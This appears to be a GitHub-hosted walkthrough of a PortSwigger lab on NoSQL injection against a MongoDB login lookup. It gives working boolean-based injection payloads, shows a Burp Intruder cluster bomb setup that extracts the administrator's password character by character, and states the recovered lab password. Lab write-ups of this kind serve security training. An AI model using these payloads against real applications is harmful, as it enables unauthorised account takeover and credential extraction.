# Lab 3: [Exploiting NoSQL injection to extract data](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data)

![image](https://github.com/user-attachments/assets/930bfc39-809c-4e28-92c2-7e817df7030c)

In this lab scenario,the login functionality is backed by a MongoDB NoSQL database and is vulnerable to injection using MongoDB query operators.

Objective: Exploit the NoSQL injection vulnerability to log in as the `administrator` user.

You can also log in to your own account using the following credentials:
* Username: `wiener`
* Password: `peter`

### Accessing the Lab

### **Step 1: Navigate to the Account Section**

Click on the **‚ÄúMy Account‚Äù** button from the homepage.

<div align="center">
    <img src="https://github.com/user-attachments/assets/c900311a-a08a-4585-860e-8bce794cf224" height="400" border="2">
    </img>
</div>

### **Step 2: Log In with Provided Credentials**

Use the default user credentials to log into the application:

* **Username:** `wiener`
* **Password:** `peter`

<div align="center">
    <img src="https://github.com/user-attachments/assets/e4ec3cc2-b72d-428a-98aa-bbd8231f3faa" height="" border="2">
    </img>
    <img src="https://github.com/user-attachments/assets/61846a77-781b-45be-aefb-45f9074731d0" height="" border="2">
    </img>
</div>

### **Step 3: Capture the Request with Burp Suite**

1. Open **Burp Suite**, go to the **Proxy** tab.
2. Click on the **HTTP History** sub-tab.

<div align="center">
    <img src="https://github.com/user-attachments/assets/de07022e-05cf-441a-9cec-ca4fadf2e294" height="" border="2">
    </img>
</div>

3. After logging in, locate the following request:

```url
GET /user/lookup?user=wiener
```

<div align="center">
    <img src="https://github.com/user-attachments/assets/3814791e-26d8-43b7-9334-338ba4878292" height="" border="2">
    </img>
</div>


### **Step 4: Analyze the Request**

1. Right-click on the request and choose **‚ÄúSend to Repeater‚Äù**.
2. Go to the **Repeater** tab to analyze and modify the request parameters safely.

<div align="center">
    <img src="https://github.com/user-attachments/assets/6f069f9e-76a8-4708-b573-1264a0c1c238" height="" border="2">
    </img>
</div>

### **Step 5: Testing for Server-Side Injection Vulnerabilities**

* In **Repeater**, modify the `user` parameter by appending a single quote `'` (e.g., `wiener'`) and send the request.

* This triggers an error response, indicating that the input might not be properly sanitized ‚Äî a strong sign of a NoSQL injection vulnerability.

<div align="center">
    <img src="https://github.com/user-attachments/assets/76090835-468b-4f3a-92c0-a75b405cb00d" height="" border="2">
    </img>
</div>


* Next, try replacing the username `wiener` with `administrator`. Surprisingly, it returns data associated with the administrator account ‚Äî confirming an **information disclosure vulnerability**.

> However, direct login to the `administrator` account is still restricted, so we'll dig deeper.

<div align="center">
    <img src="https://github.com/user-attachments/assets/a1c807e5-b0e9-45da-8d96-a56d0e9d4ee6" height="" border="2">
    </img>
</div>

* Submit a basic JavaScript-based test payload such as:

  ```js
  wiener'+' 
  ```

* Don‚Äôt forget to **URL-encode** it (Select the payload ‚Üí Press `Ctrl+U`).

* The request returns valid data again for the `wiener` account, hinting at possible server-side string evaluation ‚Äî further evidence of injection.

<div align="center">
    <img src="https://github.com/user-attachments/assets/d590e8d0-5d68-475f-b470-695150c9b392" height="" border="2">
    </img>
</div>

### **Step 6: Boolean-Based Injection (Testing Logic Manipulation)**

MongoDB projections typically hide sensitive fields like passwords, so we can't see them directly. But we can **infer behavior** based on boolean logic.

#### üîπ Test with a False Condition

Submit this payload (URL-encoded):

```js
administrator' && '1'=='2
```

* The response says: `Could not find user`.
* This means the injected condition evaluated as **false**, so no user data was returned.

<div align="center">
    <img src="https://github.com/user-attachments/assets/69a62191-75d6-474e-b63d-972f9f7bdbaa" height="" border="2">
    </img>
</div>

#### üîπ Test with a True Condition

Try this payload (URL-encoded):

```js
administrator' && '1'=='1
```

* The response returns user data (but for `wiener`), which means the injection was **successful**, and the condition evaluated as **true**.

<div align="center">
    <img src="https://github.com/user-attachments/assets/9dcbc775-fca8-4fb5-b83f-344694f37840" height="" border="2">
    </img>
</div>

These steps confirm the presence of a logic-based NoSQL injection vulnerability, and that the application behavior changes based on the injected conditions. the next step is:

### **Step 7: Determining the Administrator's Password Length via NoSQL Injection**

To extract the administrator's password length, we can use logical conditions in our injection payload.

#### üîπ Start with a High Threshold

* Modify the `user` parameter to the following payload:

```js
administrator' && this.password.length < 30 || 'a'=='b
```

> Make sure to **URL-encode** the payload before sending it.

* Since the response returns the administrator's account details, this confirms that the password length is **less than 30** characters.

<div align="center">
    <img src="https://github.com/user-attachments/assets/0484bcb2-1b4d-4cb8-95f5-3ea5d2e79278" height="" border="2">
    </img>
</div>

#### üîπ Reduce the Length Step by Step

* Now, start decreasing the length value and resending the request each time:

```js
administrator' && this.password.length < 15 || 'a'=='b
```
<div align="center">
    <img src="https://github.com/user-attachments/assets/c700abcb-2f3f-45ab-8238-9558613edac1" height="" border="2">
    </img>
</div>

* Continue this process until you identify the exact cutoff point.

<div align="center">
    <img src="https://github.com/user-attachments/assets/5a077afe-2420-4cd1-821e-704f7fa77888" height="" border="2">
    </img>
</div>

#### üîπ Pinpoint the Exact Length

* When you test with:

```js
administrator' && this.password.length < 9 || 'a'=='b
```

> You still retrieve the administrator's data, which means the password is **less than 9** characters.

<div align="center">
    <img src="https://github.com/user-attachments/assets/3b350d2c-c7c1-47b3-b802-ec57ccbb0b47" height="" border="2">
    </img>
</div>

* But when you try:

```js
administrator' && this.password.length < 8 || 'a'=='b
```

> You receive an error ‚Äî the condition is now **false**, meaning the password must be **exactly 8 characters long**.

<div align="center">
    <img src="https://github.com/user-attachments/assets/b5b0f6a7-f2c0-4a3a-907e-b47993d6fdf7" height="" border="2">
    </img>
</div> 

### **Step 8: Identifying Characters in the Administrator's Password**

In this step, we aim to discover the administrator‚Äôs password character by character using a **NoSQL Injection** technique.

#### Understanding the Logic.

We already know that the password is **8 characters long**. To extract each character, we can use a crafted payload in the query string, like this:

```js
administrator' && this.password[0] == 'a
```

* `this.password[0]` targets the **first character** of the password.
* `'a'` is the guessed character.
* If the guess is correct, the query resolves successfully and does not show an error message.

This needs to be done iteratively for each position (from index `0` to `7`) and for each possible character (a‚Äìz, 0‚Äì9, etc.).


#### Manual Testing Example

Let‚Äôs manually test the second character of the password (index `1`).
Our payload becomes:

```js
administrator' && this.password[1] == 'a
```

After URL encoding, it looks like this:

```js
administrator'+%26%26+this.password[1]%3d%3d'a
```

* Here, we are checking if the **second character** is `'a'`.

#### ‚ùå Character Not Found

* `a` is **not** the correct character at index `1`:

<div align="center">
    <img src="https://github.com/user-attachments/assets/eb9bdc0f-4c15-471c-bf5b-ea7de852a750" height="" border="2">
    </img>
</div>

* Trying with `b`, still incorrect:

<div align="center">
    <img src="https://github.com/user-attachments/assets/2e3f7610-879f-42e0-a7dd-e556330c1b40" height="" border="2">
    </img>
</div>

#### ‚úÖ Correct Character Found

After several attempts, we find that the **second character is `n`**, because the application returns a different response when this value is used:

```js
administrator' && this.password[1] == 'n
```

<div align="center">
    <img src="https://github.com/user-attachments/assets/e9e2e7af-304f-4754-aae0-718fd2f60af5" height="" border="2">
    </img>
</div>

‚ö° Automating with Burp Intruder

### **Step 9: Enumerating the Password**

1. **Send the request to Intruder:**

   * Right-click the request in the Repeater tab and select **Send to Intruder**.

<div align="center">
    <img src="https://github.com/user-attachments/assets/e437586e-d34e-4a5c-987b-0164df0cc016" height="" border="2">
    </img>
</div>

2. **Choose the Attack Type:**

   * Select the **Cluster bomb attack** option from the **Attack Type** drop-down menu.

3. **Modify the `user` parameter:**

   * Change the value of the `user` parameter to:

     ```js
     administrator' && this.password[0]=='a
     ```

<div align="center">
    <img src="https://github.com/user-attachments/assets/bb7c5e91-33b0-4489-9a16-2521a8c13560" height="" border="2">
    </img>
</div>
   

4. **URL-encode the payload:**

   * Encode the payload to ensure it's processed correctly by the server.

<div align="center">
    <img src="https://github.com/user-attachments/assets/e9d225b2-bfee-4cd6-9a51-dae3e6d20894" height="" border="2">
    </img>
</div>

5. **Set up the payload positions:**

   * Mark the first payload position as `0` and the second payload position as `a`. The request should now look like this:

     ```js
     administrator' && this.password[¬ß0¬ß]=='¬ßa¬ß
     ```

<div align="center">
    <img src="https://github.com/user-attachments/assets/00d25c49-64a2-4bbd-bcca-bb0afb407995" height="" border="2">
    </img>
</div>

6. **Configure Payload Positions:**

   * In the **Payloads** panel, select **Position 1** from the drop-down list. Add numbers from `0` to `7` for each character of the password.

<div align="center">
    <img src="https://github.com/user-attachments/assets/d8729727-b9f1-4379-998f-2d8d7d3a71b8" height="" border="2">
    </img>
</div>

   * Select **Position 2** and add lowercase letters from `a` to `z` (you can use Burp Suite Professional's built-in `a-z` list for convenience).

<div align="center">
    <img src="https://github.com/user-attachments/assets/3536217a-5f84-408d-b443-5d19ac4ced29" height="" border="2">
    </img>
</div>

7. **Start the Attack:**

   * Click **Start attack** to begin the password enumeration. The password will be revealed by length.

<div align="center">
    <img src="https://github.com/user-attachments/assets/b4fdc2f1-bd6e-4097-908e-78e847523452" height="" border="2">
    </img>
</div>

**Password Found:**

By analyzing the response from the attack, we deduce the password:

```
0 -> h
1 -> n
2 -> a
3 -> d
4 -> l
5 -> s
6 -> a
7 -> t
```

### **Step 10: Logging In with the Administrator Account**

Now that we have the password, let's log in as the administrator:

1. **Log out from the current account.**

<div align="center">
    <img src="https://github.com/user-attachments/assets/7c8cda02-603f-4878-90fd-ad6cc32b7e11" height="" border="2">
    </img>
</div>

2. **Log in with the administrator account using the password `hnadlsat`.**

<div align="center">
    <img src="https://github.com/user-attachments/assets/a264935f-b2f0-4296-8708-7d0d425ad25b" height="" border="2">
    </img>
</div>

‚úÖ We‚Äôve successfully completed the lab!
